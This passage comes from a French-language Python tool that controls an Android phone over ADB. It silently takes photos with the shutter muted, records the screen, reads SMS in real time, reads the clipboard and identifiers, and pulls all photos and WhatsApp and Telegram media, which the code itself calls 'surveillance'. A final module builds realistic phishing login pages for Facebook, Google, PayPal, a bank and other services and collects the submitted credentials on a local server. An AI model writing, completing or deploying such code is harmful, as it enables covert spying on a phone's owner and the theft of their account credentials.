        print_info(f"Capture {i+1}/{count}...")
        screenshot = take_screenshot_to_pc()
        if screenshot:
            screenshots.append(screenshot)
        time.sleep(interval)
    
    print_success(f"{len(screenshots)} captures réalisées")
    return screenshots

def get_device_imei():
    """Obtenir l'IMEI du téléphone"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📱 IMEI / IDENTIFIANTS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Plusieurs méthodes pour obtenir IMEI
    imei = adb_shell("service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.444444'")
    device_id = adb_shell("settings get secure android_id")
    serial = adb_shell("getprop ro.serialno")
    
    print_data("IMEI (partiel)", imei[:20] if imei else "Non disponible")
    print_data("Android ID", device_id)
    print_data("Numéro de série", serial)
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "device_identifiers.txt", "w", encoding="utf-8") as f:
        f.write(f"=== IDENTIFIANTS - {datetime.now()} ===\n\n")
        f.write(f"IMEI: {imei}\n")
        f.write(f"Android ID: {device_id}\n")
        f.write(f"Serial: {serial}\n")
    
    print_success("Sauvegardé: System/device_identifiers.txt")
    return {"imei": imei, "android_id": device_id, "serial": serial}

def get_sim_info():
    """Obtenir les infos de la carte SIM"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📶 INFORMATIONS SIM{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Infos opérateur
    operator = adb_shell("getprop gsm.operator.alpha")
    operator_num = adb_shell("getprop gsm.operator.numeric")
    sim_state = adb_shell("getprop gsm.sim.state")
    phone_number = adb_shell("dumpsys telephony.registry | grep mLine1Number")
    network_type = adb_shell("getprop gsm.network.type")
    signal = adb_shell("dumpsys telephony.registry | grep mSignalStrength")
    
    print_data("Opérateur", operator)
    print_data("Code opérateur", operator_num)
    print_data("État SIM", sim_state)
    print_data("Numéro", phone_number[:50] if phone_number else "Non disponible")
    print_data("Type réseau", network_type)
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "sim_info.txt", "w", encoding="utf-8") as f:
        f.write(f"=== INFO SIM - {datetime.now()} ===\n\n")
        f.write(f"Opérateur: {operator}\n")
        f.write(f"Code: {operator_num}\n")
        f.write(f"État: {sim_state}\n")
        f.write(f"Numéro: {phone_number}\n")
        f.write(f"Réseau: {network_type}\n")
        f.write(f"Signal: {signal}\n")
    
    print_success("Sauvegardé: System/sim_info.txt")
    return operator

def flash_screen():
    """Faire clignoter l'écran (flash)"""
    print_info("Flash de l'écran...")
    for _ in range(3):
        adb_shell("settings put system screen_brightness 255")
        time.sleep(0.2)
        adb_shell("settings put system screen_brightness 0")
        time.sleep(0.2)
    adb_shell("settings put system screen_brightness 128")
    print_success("Flash terminé")

def play_sound_alarm():
    """Jouer un son d'alarme sur le téléphone"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🔊 ALARME SONORE{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Mettre le volume au max
    adb_shell("cmd media_session volume --stream 5 --set 7")  # Alarme
    adb_shell("cmd media_session volume --stream 2 --set 7")  # Sonnerie
    
    # Jouer une tonalité
    adb_shell('am start -a android.intent.action.RINGTONE_PICKER')
    
    print_success("Alarme déclenchée - Volume au maximum")
    return True

def open_camera_front():
    """Ouvrir la caméra frontale"""
    adb_shell("am start -a android.media.action.IMAGE_CAPTURE --ei android.intent.extras.CAMERA_FACING 1")
    print_success("Caméra frontale ouverte")

def open_camera_back():
    """Ouvrir la caméra arrière"""
    adb_shell("am start -a android.media.action.IMAGE_CAPTURE --ei android.intent.extras.CAMERA_FACING 0")
    print_success("Caméra arrière ouverte")

def take_photo_silent():
    """Prendre une photo silencieusement"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📷 PHOTO SILENCIEUSE{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Couper le son
    adb_shell("cmd media_session volume --stream 1 --set 0")
    
    # Ouvrir caméra
    adb_shell("am start -a android.media.action.STILL_IMAGE_CAMERA")
    time.sleep(2)
    
    # Prendre la photo
    adb_shell("input keyevent KEYCODE_CAMERA")
    time.sleep(1)
    
    # Retour home
    adb_shell("input keyevent KEYCODE_HOME")
    
    # Récupérer la dernière photo
    last_photo = adb_shell("ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1")
    
    if last_photo and ".jpg" in last_photo:
        local_file = OUTPUT_BASE / "Photos" / f"silent_{timestamp}.jpg"
        adb_pull(last_photo.strip(), str(local_file))
        
        if local_file.exists():
            print_success(f"Photo: {local_file.name}")
            return str(local_file)
    
    print_warning("Photo peut-être non capturée")
    return None

def record_video_screen(duration=30):
    """Enregistrer l'écran avec audio interne"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🎥 ENREGISTREMENT ÉCRAN + AUDIO{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    if duration > 180:
        duration = 180
        print_warning("Durée limitée à 180 secondes")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/screenrec_{timestamp}.mp4"
    local_file = OUTPUT_BASE / "Recordings" / f"screenrec_{timestamp}.mp4"
    
    print_info(f"Enregistrement pendant {duration} secondes...")
    
    # Enregistrer avec audio
    adb_shell(f"screenrecord --time-limit {duration} --bit-rate 4000000 {remote_file}", timeout=duration+10)
    
    # Télécharger
    adb_pull(remote_file, str(local_file))
    adb_shell(f"rm {remote_file}")
    
    if local_file.exists():
        size = local_file.stat().st_size / (1024*1024)
        print_success(f"Vidéo: {local_file.name} ({size:.1f} MB)")
        return str(local_file)
    
    print_error("Échec de l'enregistrement")
    return None

def get_clipboard_content():
    """Lire le presse-papiers de manière lisible"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📋 PRESSE-PAPIERS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Méthode via broadcast
    result = adb_shell("am broadcast -a clipper.get 2>/dev/null")
    
    # Méthode alternative via service
    if not result or "null" in result.lower():
        result = adb_shell("service call clipboard 2 s16 com.android.shell 2>/dev/null")
        # Parser le résultat Parcel
        if "Parcel" in result:
            try:
                # Extraire le texte entre quotes
                import re
                matches = re.findall(r"'([^']*)'", result)
                if matches:
                    result = ''.join(matches)
            except:
                pass
    
    if result and len(result) > 10:
        print_data("Contenu", result[:500])
    else:
        print_warning("Presse-papiers vide ou inaccessible")
    
    return result

def type_text_fast(text):
    """Taper du texte rapidement sur l'écran"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}⌨️ SAISIE TEXTE{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Échapper les caractères spéciaux
    text = text.replace(" ", "%s")
    text = text.replace("'", "\\'")
    text = text.replace('"', '\\"')
    text = text.replace("&", "\\&")
    text = text.replace("<", "\\<")
    text = text.replace(">", "\\>")
    text = text.replace(";", "\\;")
    text = text.replace("(", "\\(")
    text = text.replace(")", "\\)")
    
    adb_shell(f'input text "{text}"')
    print_success(f"Texte tapé: {text[:50]}...")
    return True

def open_settings_page(page=""):
    """Ouvrir une page de paramètres spécifique"""
    settings_pages = {
        "wifi": "android.settings.WIFI_SETTINGS",
        "bluetooth": "android.settings.BLUETOOTH_SETTINGS",
        "display": "android.settings.DISPLAY_SETTINGS",
        "sound": "android.settings.SOUND_SETTINGS",
        "battery": "android.settings.BATTERY_SAVER_SETTINGS",
        "apps": "android.settings.APPLICATION_SETTINGS",
        "security": "android.settings.SECURITY_SETTINGS",
        "location": "android.settings.LOCATION_SOURCE_SETTINGS",
        "developer": "android.settings.APPLICATION_DEVELOPMENT_SETTINGS",
        "date": "android.settings.DATE_SETTINGS",
        "language": "android.settings.LOCALE_SETTINGS",
        "storage": "android.settings.INTERNAL_STORAGE_SETTINGS",
        "accessibility": "android.settings.ACCESSIBILITY_SETTINGS",
        "nfc": "android.settings.NFC_SETTINGS",
        "airplane": "android.settings.AIRPLANE_MODE_SETTINGS",
        "vpn": "android.settings.VPN_SETTINGS",
        "hotspot": "android.settings.TETHER_SETTINGS",
        "accounts": "android.settings.SYNC_SETTINGS",
        "backup": "android.settings.BACKUP_SETTINGS",
        "about": "android.settings.DEVICE_INFO_SETTINGS",
    }
    
    if page.lower() in settings_pages:
        action = settings_pages[page.lower()]
    else:
        action = "android.settings.SETTINGS"
    
    adb_shell(f"am start -a {action}")
    print_success(f"Paramètres ouverts: {page if page else 'principal'}")

def get_storage_info():
    """Informations détaillées sur le stockage"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}💾 STOCKAGE DÉTAILLÉ{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Espace disque
    df = adb_shell("df -h")
    print(f"    {C.YELLOW}Espace disque:{C.END}\n")
    for line in df.split('\n')[:10]:
        if line.strip() and ('G' in line or 'M' in line):
            print(f"        {line[:70]}")
    
    # Taille des dossiers principaux
    print(f"\n    {C.YELLOW}Taille des dossiers:{C.END}\n")
    folders = ["/sdcard/DCIM", "/sdcard/Download", "/sdcard/WhatsApp", "/sdcard/Pictures"]
    for folder in folders:
        size = adb_shell(f"du -sh {folder} 2>/dev/null | cut -f1")
        if size and "No such" not in size:
            print(f"        📁 {folder}: {size}")
    
    return df

def get_network_info():
    """Informations réseau détaillées"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🌐 INFORMATIONS RÉSEAU{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # IP
    ip = adb_shell("ip addr show wlan0 2>/dev/null | grep 'inet '")
    print_data("IP WiFi", ip.split()[1] if ip and 'inet' in ip else "Non connecté")
    
    # Gateway
    gateway = adb_shell("ip route | grep default")
    print_data("Gateway", gateway.split()[2] if gateway else "N/A")
    
    # DNS
    dns = adb_shell("getprop net.dns1")
    print_data("DNS", dns)
    
    # MAC
    mac = adb_shell("cat /sys/class/net/wlan0/address 2>/dev/null")
    print_data("MAC", mac)
    
    # Connexions actives
    print(f"\n    {C.YELLOW}Connexions actives:{C.END}\n")
    netstat = adb_shell("netstat -an 2>/dev/null | grep ESTABLISHED | head -10")
    for line in netstat.split('\n')[:10]:
        if line.strip():
            print(f"        {line[:70]}")
    
    return ip

def watch_screen_continuous():
    """Surveillance continue avec scrcpy en mode record"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}👁️ SURVEILLANCE CONTINUE{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    record_file = OUTPUT_BASE / "Recordings" / f"surveillance_{timestamp}.mp4"
    
    if os.path.exists(SCRCPY_PATH):
        print_info("Lancement surveillance avec enregistrement...")
        print_info(f"Fichier: {record_file}")
        print_warning("Appuyez sur Ctrl+C pour arrêter")
        
        cmd = f'"{SCRCPY_PATH}" -s {DEVICE} --record "{record_file}" --no-audio'
        subprocess.Popen(cmd, shell=True)
        
        print_success("Surveillance lancée!")
    else:
        print_error("Scrcpy non trouvé")

def extract_all_media():
    """Extraire tous les médias (photos, vidéos, audio)"""
    print(f"\n{C.RED}{'═'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}📸 EXTRACTION TOUS MÉDIAS{C.END}")
    print(f"{C.RED}{'═'*70}{C.END}\n")
    
    total = 0
    
    # Photos
    print_info("Extraction photos...")
    adb_pull("/sdcard/DCIM", str(OUTPUT_BASE / "Photos" / "DCIM"))
    adb_pull("/sdcard/Pictures", str(OUTPUT_BASE / "Photos" / "Pictures"))
    
    # Vidéos
    print_info("Extraction vidéos...")
    adb_pull("/sdcard/Movies", str(OUTPUT_BASE / "Videos" / "Movies"))
    
    # Audio
    print_info("Extraction audio...")
    adb_pull("/sdcard/Music", str(OUTPUT_BASE / "Audio"))
    adb_pull("/sdcard/Recordings", str(OUTPUT_BASE / "Audio" / "Recordings"))
    
    # WhatsApp
    print_info("Extraction WhatsApp...")
    adb_pull("/sdcard/WhatsApp/Media", str(OUTPUT_BASE / "WhatsApp" / "Media"))
    
    # Telegram
    print_info("Extraction Telegram...")
    adb_pull("/sdcard/Telegram", str(OUTPUT_BASE / "Telegram"))
    
    # Compter
    for folder in [OUTPUT_BASE / "Photos", OUTPUT_BASE / "Videos", OUTPUT_BASE / "Audio", OUTPUT_BASE / "WhatsApp"]:
        if folder.exists():
            total += sum(1 for f in folder.rglob("*") if f.is_file())
    
    print_success(f"Total: {total} fichiers extraits")
    return total

def monitor_sms_live(duration=60):
    """Surveiller les SMS en temps réel"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📱 SURVEILLANCE SMS EN DIRECT ({duration}s){C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    print_info("Surveillance des nouveaux SMS...")
    print_warning("Attendez qu'un SMS arrive...")
    
    # Obtenir le dernier SMS actuel
    last_sms = adb_shell('content query --uri content://sms/inbox --projection "_id" --sort "_id DESC LIMIT 1"')
    last_id = "0"
    if "id=" in last_sms:
        try:
            last_id = last_sms.split("_id=")[1].split(",")[0]
        except:
            pass
    
    start_time = time.time()
    new_sms_count = 0
    
    while time.time() - start_time < duration:
        current = adb_shell(f'content query --uri content://sms/inbox --projection "_id,address,body" --where "_id > {last_id}" --sort "_id DESC"')
        
        if "Row:" in current and current != last_sms:
            print(f"\n    {C.GREEN}🆕 NOUVEAU SMS DÉTECTÉ!{C.END}")
            for row in current.split("Row:")[:3]:
                if "address=" in row:
                    try:
                        addr = row.split("address=")[1].split(",")[0]
                        body = row.split("body=")[1].split(",")[0][:100]
                        print(f"        📩 De: {addr}")
                        print(f"        📝 Message: {body}...")
                    except:
                        pass
            
            # Mettre à jour le dernier ID
            try:
                last_id = current.split("_id=")[1].split(",")[0]
            except:
                pass
            
            new_sms_count += 1
            last_sms = current
        
        time.sleep(2)
        print(".", end="", flush=True)
    
    print(f"\n\n    📊 {new_sms_count} nouveau(x) SMS détecté(s)")
    return new_sms_count

def get_installed_apps_detailed():
    """Liste détaillée des applications avec tailles"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📱 APPLICATIONS DÉTAILLÉES{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Apps tierces
    apps = adb_shell("pm list packages -3 -f")
    app_list = []
    
    for line in apps.split('\n'):
        if 'package:' in line:
            try:
                path = line.split('package:')[1].split('=')[0]
                package = line.split('=')[-1]
                
                # Taille
                size = adb_shell(f"stat -c%s {path} 2>/dev/null")
                size_mb = int(size) / (1024*1024) if size.isdigit() else 0
                
                app_list.append({
                    "package": package.strip(),
                    "path": path,
                    "size_mb": round(size_mb, 2)
                })
                
                if len(app_list) <= 20:
                    print(f"        📦 {package.strip()[:40]:<40} {size_mb:.1f} MB")
            except:
                pass
    
    # Trier par taille
    app_list.sort(key=lambda x: x['size_mb'], reverse=True)
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Apps" / "apps_detailed.json", "w", encoding="utf-8") as f:
        json.dump(app_list, f, indent=2, ensure_ascii=False)
    
    total_size = sum(a['size_mb'] for a in app_list)
    print(f"\n    📊 Total: {len(app_list)} apps ({total_size:.1f} MB)")
    print_success("Sauvegardé: Apps/apps_detailed.json")
    
    return app_list


# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 19: PROCESSUS ET MÉMOIRE
# ═══════════════════════════════════════════════════════════════════════════════

def get_running_processes():
    """Lister les processus en cours"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}⚙️ PROCESSUS EN COURS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Top processus
    ps = adb_shell("ps -A | head -50")
    
    print(f"    {C.YELLOW}Processus actifs:{C.END}\n")
    for line in ps.split('\n')[:20]:
        if line.strip():
            print(f"        {line[:75]}")
    
    # Mémoire
    print(f"\n    {C.YELLOW}Utilisation mémoire:{C.END}\n")
    meminfo = adb_shell("cat /proc/meminfo | head -10")
    for line in meminfo.split('\n'):
        if line.strip():
            print(f"        {line}")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "processes.txt", "w", encoding="utf-8") as f:
        f.write(f"=== PROCESSUS - {datetime.now()} ===\n\n")
        f.write(ps)
        f.write("\n\n=== MÉMOIRE ===\n")
        f.write(meminfo)
    
    print_success("Sauvegardé: System/processes.txt")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 20: PERMISSIONS DES APPS
# ═══════════════════════════════════════════════════════════════════════════════

def get_app_permissions(package=None):
    """Voir les permissions d'une ou toutes les apps"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🔒 PERMISSIONS DES APPLICATIONS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    if package:
        # Permissions d'une app spécifique
        perms = adb_shell(f"dumpsys package {package} | grep -A 100 'granted=true'")
        print(f"    {C.YELLOW}Permissions de {package}:{C.END}\n")
        
        dangerous_perms = [
            "CAMERA", "MICROPHONE", "LOCATION", "CONTACTS", 
            "SMS", "PHONE", "STORAGE", "CALENDAR"
        ]
        
        for line in perms.split('\n'):
            if 'android.permission' in line:
                perm = line.strip()
                is_dangerous = any(d in perm.upper() for d in dangerous_perms)
                icon = "🔴" if is_dangerous else "🟢"
                print(f"        {icon} {perm[:60]}")
    else:
        # Apps avec permissions dangereuses
        print(f"    {C.YELLOW}Apps avec accès CAMERA:{C.END}")
        camera = adb_shell("pm list packages -p | xargs -I {} dumpsys package {} | grep -B1 'CAMERA.*granted=true' | grep 'Package'")
        print(camera[:500] if camera else "        Aucune")
        
        print(f"\n    {C.YELLOW}Apps avec accès MICROPHONE:{C.END}")
        mic = adb_shell("pm list packages -p | xargs -I {} dumpsys package {} | grep -B1 'RECORD_AUDIO.*granted=true' | grep 'Package'")
        print(mic[:500] if mic else "        Aucune")
        
        print(f"\n    {C.YELLOW}Apps avec accès LOCALISATION:{C.END}")
        location = adb_shell("pm list packages -p | xargs -I {} dumpsys package {} | grep -B1 'FINE_LOCATION.*granted=true' | grep 'Package'")
        print(location[:500] if location else "        Aucune")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 21: CLIPBOARD (PRESSE-PAPIERS)
# ═══════════════════════════════════════════════════════════════════════════════

def get_clipboard():
    """Lire le presse-papiers"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📋 PRESSE-PAPIERS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    clipboard = adb_shell("service call clipboard 2 s16 com.android.shell")
    
    print_data("Contenu", clipboard[:200] if clipboard else "Vide ou inaccessible")
    
    return clipboard

def set_clipboard(text):
    """Définir le presse-papiers"""
    adb_shell(f'am broadcast -a clipper.set -e text "{text}"')
    print_success(f"Presse-papiers défini: {text[:50]}...")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 22: CAMÉRA
# ═══════════════════════════════════════════════════════════════════════════════

def take_photo(camera="back"):
    """Prendre une photo avec la caméra"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📷 CAPTURE CAMÉRA{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    print_info(f"Ouverture caméra {camera}...")
    adb_shell("am start -a android.media.action.STILL_IMAGE_CAMERA")
    time.sleep(3)
    print_info("Capture en cours...")
    adb_shell("input keyevent KEYCODE_CAMERA")
    time.sleep(2)
    adb_shell("input keyevent KEYCODE_HOME")
    print_info("Récupération de la photo...")
    last_photo = adb_shell("ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1")
    if last_photo and ".jpg" in last_photo:
        local_file = OUTPUT_BASE / "Photos" / f"camera_{timestamp}.jpg"
        adb_pull(last_photo.strip(), str(local_file))
        if local_file.exists():
            print_success(f"Photo sauvegardée : {local_file.name}")
            print_info(f"Chemin du fichier photo : {local_file}")
            return str(local_file)
    print_warning("Photo peut-être non capturée - vérifiez manuellement")
    return None

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 23: INSTALLATION/DÉSINSTALLATION D'APPS
# ═══════════════════════════════════════════════════════════════════════════════

def install_apk(apk_path):
    """Installer une APK"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📥 INSTALLATION APK{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    if not os.path.exists(apk_path):
        print_error(f"Fichier non trouvé: {apk_path}")
        return False
    
    print_info(f"Installation de {os.path.basename(apk_path)}...")
    result = adb(f'install -r "{apk_path}"')
    
    if "Success" in result:
        print_success("Installation réussie!")
        return True
    else:
        print_error(f"Échec: {result}")
        return False

def uninstall_app(package):
    """Désinstaller une application"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🗑️ DÉSINSTALLATION{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    print_warning(f"Désinstallation de {package}...")
    result = adb(f'uninstall {package}')
    
    if "Success" in result:
        print_success("Désinstallation réussie!")
        return True
    else:
        print_error(f"Échec: {result}")
        return False

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 24: BACKUP COMPLET
# ═══════════════════════════════════════════════════════════════════════════════

def full_backup():
    """Créer un backup complet"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}💾 BACKUP COMPLET{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = OUTPUT_BASE / f"backup_{timestamp}.ab"
    
    print_warning("Un popup va apparaître sur le téléphone")
    print_info("Appuyez sur 'SAUVEGARDER MES DONNÉES' sur le téléphone")
    
    result = adb(f'backup -apk -shared -all -f "{backup_file}"', timeout=300)
    
    if backup_file.exists():
        size = backup_file.stat().st_size / (1024*1024)
        print_success(f"Backup créé: {backup_file.name} ({size:.1f} MB)")
        return str(backup_file)
    else:
        print_error("Backup échoué ou annulé")
        return None

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 26: PHISHING - FAUX SITES WEB 🎣
# ═══════════════════════════════════════════════════════════════════════════════

import threading
import socket
import webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# Variable globale pour les données capturées
CAPTURED_DATA = []
PHISHING_SERVER = None
PHISHING_PORT = 8888

def get_local_ip():
    """Obtenir l'IP locale de la machine"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_phishing_page(template="facebook"):
    """Génère une page de phishing selon le template - ULTRA RÉALISTE"""
    
    templates = {
        "facebook": {
            "title": "Facebook - Connectez-vous",
            "logo": "https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg",
            "color": "#1877f2",
            "fields": ["email", "password"],
            "button": "Se connecter",
            "redirect": "https://www.facebook.com",
            "subtitle": "Connectez-vous à Facebook",
            "forgot": "Mot de passe oublié ?",
            "create": "Créer un compte"
        },
        "google": {
            "title": "Se connecter - Comptes Google",
            "logo": "https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png",
            "color": "#1a73e8",
            "fields": ["email", "password"],
            "button": "Suivant",
            "redirect": "https://www.google.com",
            "subtitle": "Utiliser votre compte Google",
            "forgot": "Mot de passe oublié ?",
            "create": "Créer un compte"
        },
        "instagram": {
            "title": "Instagram",
            "logo": "https://i.imgur.com/zqpwkLQ.png",
            "color": "#0095f6",
            "fields": ["username", "password"],
            "button": "Se connecter",
            "redirect": "https://www.instagram.com",
            "subtitle": "",
            "forgot": "Mot de passe oublié ?",
            "create": "Inscrivez-vous"
        },
        "whatsapp": {
            "title": "WhatsApp Web - Vérification",
            "logo": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg",
            "color": "#25d366",
            "fields": ["phone", "verification_code"],
            "button": "Vérifier",
            "redirect": "https://web.whatsapp.com",
            "subtitle": "Vérification de sécurité requise",
            "forgot": "",
            "create": ""
        },
        "bank": {
            "title": "Espace Client - Banque Sécurisée",
            "logo": "",
            "color": "#003366",
            "fields": ["numero_compte", "mot_de_passe", "code_secret"],
            "button": "Accéder à mon compte",
            "redirect": "https://www.google.com/search?q=banque+en+ligne",
            "subtitle": "Connexion sécurisée à votre espace personnel",
            "forgot": "Identifiants oubliés ?",
            "create": ""
        },
        "netflix": {
            "title": "Netflix - Connexion",
            "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
            "color": "#e50914",
            "fields": ["email", "password"],
            "button": "S'identifier",
            "redirect": "https://www.netflix.com",
            "subtitle": "",
            "forgot": "Besoin d'aide ?",
            "create": "Inscrivez-vous"
        },
        "paypal": {
            "title": "PayPal - Connexion sécurisée",
            "logo": "https://www.paypalobjects.com/webstatic/icon/pp258.png",
            "color": "#0070ba",
            "fields": ["email", "password"],
            "button": "Connexion",
            "redirect": "https://www.paypal.com",
            "subtitle": "Payez en toute sécurité",
            "forgot": "Mot de passe oublié ?",
            "create": "Ouvrir un compte"
        },
        "tiktok": {
            "title": "TikTok - Connexion",
            "logo": "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efa1520dcd11f4b45c0a6e.svg",
            "color": "#fe2c55",
            "fields": ["email_ou_telephone", "mot_de_passe"],
            "button": "Connexion",
            "redirect": "https://www.tiktok.com",
            "subtitle": "",
            "forgot": "Mot de passe oublié ?",
            "create": "S'inscrire"
        },
        "snapchat": {
            "title": "Snapchat - Login",
            "logo": "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png",
            "color": "#fffc00",
            "fields": ["username", "password"],
            "button": "Log In",
            "redirect": "https://www.snapchat.com",
            "subtitle": "",
            "forgot": "Forgot Password?",
            "create": "Sign Up"
        },
        "outlook": {
            "title": "Connexion - Microsoft",
            "logo": "https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo.png",
            "color": "#0078d4",
            "fields": ["email", "password"],
            "button": "Se connecter",
            "redirect": "https://outlook.live.com",
            "subtitle": "",
            "forgot": "Impossible d'accéder à votre compte ?",
            "create": "Créer un compte"
        },
        "amazon": {
            "title": "Amazon - Connexion",
            "logo": "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg",
            "color": "#ff9900",
            "fields": ["email_ou_telephone", "mot_de_passe"],
            "button": "Continuer",
            "redirect": "https://www.amazon.fr",
            "subtitle": "Se connecter",
            "forgot": "Mot de passe oublié ?",
            "create": "Créer votre compte Amazon"
        },
        "custom": {
            "title": "Connexion Sécurisée",
            "logo": "",
            "color": "#333333",
            "fields": ["identifiant", "mot_de_passe"],
            "button": "Valider",
            "redirect": "https://www.google.com",
            "subtitle": "Accès à votre espace personnel",
            "forgot": "Mot de passe oublié ?",
            "create": ""
        }
    }
    
    t = templates.get(template, templates["custom"])
    
    fields_html = ""
    for field in t["fields"]:
        field_type = "password" if "password" in field.lower() or "secret" in field.lower() else "text"
        placeholder = field.replace("_", " ").title()
        fields_html += f'''
        <input type="{field_type}" name="{field}" placeholder="{placeholder}" required 
               style="width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; 
                      border-radius: 5px; font-size: 16px; box-sizing: border-box;">
        '''
    
    # Liens optionnels
    forgot_html = f'<a href="#" style="color: {t["color"]}; text-decoration: none; font-size: 14px;">{t.get("forgot", "")}</a>' if t.get("forgot") else ""
    create_html = f'<a href="#" style="color: {t["color"]}; text-decoration: none; font-size: 14px; font-weight: bold;">{t.get("create", "")}</a>' if t.get("create") else ""
    subtitle_html = f'<p style="color: #666; margin-bottom: 20px; font-size: 16px;">{t.get("subtitle", "")}</p>' if t.get("subtitle") else ""
    
    # Stocker l'URL de redirection dans un champ caché
    redirect_url = t.get("redirect", "https://www.google.com")
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{t["title"]}</title>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
            text-align: center;
        }}
        .logo {{
            max-width: 180px;
            height: auto;
            margin-bottom: 20px;
        }}
        h1 {{
            color: #1c1e21;
            margin-bottom: 10px;
            font-size: 24px;
            font-weight: normal;
        }}
        input {{
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }}
        input:focus {{
            border-color: {t["color"]};
            outline: none;
            box-shadow: 0 0 0 2px {t["color"]}33;
        }}
        .btn {{
            width: 100%;
            padding: 14px;
            background: {t["color"]};
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
